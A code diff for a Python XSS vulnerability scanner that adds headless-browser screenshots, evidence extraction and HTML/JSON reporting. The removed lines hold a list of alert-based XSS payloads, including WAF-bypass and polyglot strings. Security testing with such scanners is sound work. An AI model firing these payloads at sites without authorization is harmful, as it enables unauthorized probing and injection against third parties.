@@ -4,6 +4,7 @@ import requests
 import re
 import json
 import logging
+import hashlib
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse
 from typing import List, Dict, Set, Optional
@@ -11,6 +12,12 @@ from concurrent.futures import ThreadPoolExecutor
 from tqdm import tqdm
 import colorama
 from colorama import Fore, Style
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
+from xss_payloads import XSSPayloads
+from report_generator import ReportGenerator
 
 # Initialize colorama
 colorama.init()
@@ -22,7 +29,10 @@ class XSSScanner:
         self.session = requests.Session()
         self.vulnerabilities = []
         self.visited_urls = set()
+        self.payloads = XSSPayloads()
+        self.report_generator = ReportGenerator()
         self.setup_logging()
+        self.setup_browser()
 
     def setup_logging(self):
         logging.basicConfig(
@@ -35,56 +45,26 @@ class XSSScanner:
         )
         self.logger = logging.getLogger(__name__)
 
-    def load_payloads(self) -> List[str]:
-        """Load XSS payloads from different categories"""
-        payloads = []
+    def setup_browser(self):
+        """Setup headless Chrome browser for screenshots"""
+        chrome_options = Options()
+        chrome_options.add_argument('--headless')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
+        chrome_options.add_argument('--disable-gpu')
+        chrome_options.add_argument('--window-size=1920,1080')
         
-        # Basic XSS payloads
-        basic_payloads = [
-            '<script>alert(1)</script>',
-            '"><script>alert(1)</script>',
-            '"><img src=x onerror=alert(1)>',
-            '"><svg/onload=alert(1)>',
-            'javascript:alert(1)',
-        ]
-        
-        # DOM-based XSS payloads
-        dom_payloads = [
-            '"><img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
-            '"><svg/onload=eval(atob("YWxlcnQoMSk="))>',
-            '"><script>eval(atob("YWxlcnQoMSk="))</script>',
-        ]
-        
-        # WAF bypass payloads
-        waf_bypass_payloads = [
-            '<scr<script>ipt>alert(1)</scr</script>ipt>',
-            '<scr\x00ipt>alert(1)</scr\x00ipt>',
-            '<scr\x0Aipt>alert(1)</scr\x0Aipt>',
-            '<scr\x0Dipt>alert(1)</scr\x0Dipt>',
-            '<scr\x09ipt>alert(1)</scr\x09ipt>',
-        ]
-        
-        # Event-based XSS payloads
-        event_payloads = [
-            '"><img src=x onerror=alert(1)>',
-            '"><body onload=alert(1)>',
-            '"><input onfocus=alert(1) autofocus>',
-            '"><select onmouseover=alert(1)>',
-        ]
-        
-        # Polyglot XSS payloads
-        polyglot_payloads = [
-            'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//<stYle/onload=alert()>//',
-            '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>',
-        ]
-        
-        payloads.extend(basic_payloads)
-        payloads.extend(dom_payloads)
-        payloads.extend(waf_bypass_payloads)
-        payloads.extend(event_payloads)
-        payloads.extend(polyglot_payloads)
-        
-        return payloads
+        service = Service(ChromeDriverManager().install())
+        self.browser = webdriver.Chrome(service=service, options=chrome_options)
+
+    def capture_screenshot(self, url: str, payload: str) -> Optional[bytes]:
+        """Capture screenshot of the page with XSS payload"""
+        try:
+            self.browser.get(url)
+            return self.browser.get_screenshot_as_png()
+        except Exception as e:
+            self.logger.error(f"Error capturing screenshot: {str(e)}")
+            return None
 
     def scan_url(self, url: str) -> None:
         """Scan a single URL for XSS vulnerabilities"""
@@ -126,7 +106,7 @@ class XSSScanner:
             
         form_url = urljoin(url, form_action)
         
-        for payload in self.load_payloads():
+        for payload in self.payloads.get_all_payloads():
             try:
                 if form_method == 'get':
                     response = self.session.get(form_url, params={payload: payload})
@@ -145,7 +125,7 @@ class XSSScanner:
         if not input_name:
             return
             
-        for payload in self.load_payloads():
+        for payload in self.payloads.get_all_payloads():
             try:
                 response = self.session.get(url, params={input_name: payload})
                 if self.check_xss_success(response, payload):
@@ -160,7 +140,7 @@ class XSSScanner:
         if not href:
             return
             
-        for payload in self.load_payloads():
+        for payload in self.payloads.get_all_payloads():
             try:
                 test_url = urljoin(url, href)
                 response = self.session.get(test_url, params={'test': payload})
@@ -191,43 +171,64 @@ class XSSScanner:
                 
         return False
 
+    def get_evidence_snippet(self, response: requests.Response, payload: str) -> str:
+        """Extract relevant snippet from response for evidence"""
+        try:
+            soup = BeautifulSoup(response.text, 'html.parser')
+            # Find the element containing the payload
+            for element in soup.find_all():
+                if payload in str(element):
+                    return str(element)
+            return response.text[:500] + "..."  # Return first 500 chars if no specific element found
+        except:
+            return response.text[:500] + "..."
+
     def report_vulnerability(self, url: str, vuln_type: str, payload: str, response: requests.Response) -> None:
-        """Report found vulnerability"""
+        """Report found vulnerability with evidence and screenshot"""
+        # Generate unique ID for this vulnerability
+        vuln_id = hashlib.md5(f"{url}{payload}".encode()).hexdigest()[:8]
+        
+        # Capture screenshot
+        screenshot = self.capture_screenshot(url, payload)
+        screenshot_path = None
+        if screenshot:
+            screenshot_path = self.report_generator.save_screenshot(screenshot, vuln_id)
+        
+        # Get evidence snippet
+        evidence = self.get_evidence_snippet(response, payload)
+        
         vulnerability = {
             'url': url,
             'type': vuln_type,
             'payload': payload,
             'response_length': len(response.text),
             'status_code': response.status_code,
+            'screenshot': screenshot_path,
+            'evidence': evidence
         }
         
-        self.vulnerabilities.append(vulnerability)
-        self.logger.warning(f"{Fore.RED}[!] Found XSS vulnerability in {url} ({vuln_type}){Style.RESET_ALL}")
-        self.logger.warning(f"Payload: {payload}")
+        # Check for duplicates
+        if not any(v['url'] == url and v['payload'] == payload for v in self.vulnerabilities):
+            self.vulnerabilities.append(vulnerability)
+            self.logger.warning(f"{Fore.RED}[!] Found XSS vulnerability in {url} ({vuln_type}){Style.RESET_ALL}")
+            self.logger.warning(f"Payload: {payload}")
+            self.logger.warning(f"Evidence: {evidence[:100]}...")
 
     def generate_report(self) -> None:
-        """Generate a detailed report of found vulnerabilities"""
+        """Generate detailed reports"""
         if not self.vulnerabilities:
             print(f"{Fore.GREEN}[+] No XSS vulnerabilities found{Style.RESET_ALL}")
             return
             
-        print(f"\n{Fore.YELLOW}[*] XSS Scan Report{Style.RESET_ALL}")
-        print("=" * 50)
+        print(f"\n{Fore.YELLOW}[*] Generating XSS Scan Reports{Style.RESET_ALL}")
         
-        for vuln in self.vulnerabilities:
-            print(f"\n{Fore.RED}[!] Vulnerability Found{Style.RESET_ALL}")
-            print(f"URL: {vuln['url']}")
-            print(f"Type: {vuln['type']}")
-            print(f"Payload: {vuln['payload']}")
-            print(f"Response Length: {vuln['response_length']}")
-            print(f"Status Code: {vuln['status_code']}")
-            print("-" * 50)
-            
-        # Save report to file
-        with open('xss_report.json', 'w') as f:
-            json.dump(self.vulnerabilities, f, indent=4)
-            
-        print(f"\n{Fore.GREEN}[+] Report saved to xss_report.json{Style.RESET_ALL}")
+        # Generate HTML report
+        html_report = self.report_generator.generate_report(self.target_url, self.vulnerabilities)
+        print(f"{Fore.GREEN}[+] HTML report saved to: {html_report}{Style.RESET_ALL}")
+        
+        # Generate JSON report
+        json_report = self.report_generator.save_json_report(self.vulnerabilities)
+        print(f"{Fore.GREEN}[+] JSON report saved to: {json_report}{Style.RESET_ALL}")
 
     def start_scan(self) -> None:
         """Start the XSS scanning process"""
@@ -244,6 +245,10 @@ class XSSScanner:
         except Exception as e:
             self.logger.error(f"Error during scan: {str(e)}")
             self.generate_report()
+            
+        finally:
+            # Cleanup
+            self.browser.quit()
 
 if __name__ == "__main__":
     import argparse
